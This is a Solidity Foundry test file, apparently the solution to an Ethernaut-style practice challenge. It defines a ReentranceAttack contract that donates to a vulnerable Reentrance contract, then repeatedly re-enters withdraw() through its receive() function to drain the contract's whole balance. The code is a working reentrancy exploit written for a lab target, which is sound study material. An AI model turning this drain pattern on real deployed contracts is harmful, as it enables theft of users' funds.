// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {Reentrance} from "../src/Reentrance.sol";

contract ReentranceTest is Test {

    Reentrance ret;

    ReentranceAttack attack;

    address newOwner = makeAddr("NOw");

    function setUp() public {

        ret = new Reentrance();
        
        attack = new ReentranceAttack(ret);

        vm.deal(address(attack), 1 ether);


    }

    modifier addDonate {

        for(uint160 i = 1 ; i < 3 ; i++){

            hoax(address(i),1 ether);
            ret.donate{value : 1 ether}(address(i));

        }

        _;
    }
    

    function testAttackAllthemoney() public addDonate {


        vm.prank(address(attack));
        attack.attack_1();


        console.log("Balance of Contract : " , address(ret).balance);
        console.log("Balance of Attacker : " , address(attack).balance);
        
    }
}

contract ReentranceAttack {

    Reentrance ret;

    constructor(Reentrance _ret){

        ret = _ret;
    }


    function attack_1() public payable{
        ret.donate{value: 1 ether}(address(this));
        ret.withdraw(1 ether);
    }


    receive() external payable {

        if(address(ret).balance > 0){
              ret.withdraw(1 ether);

        }

    }

    fallback() external payable {}
}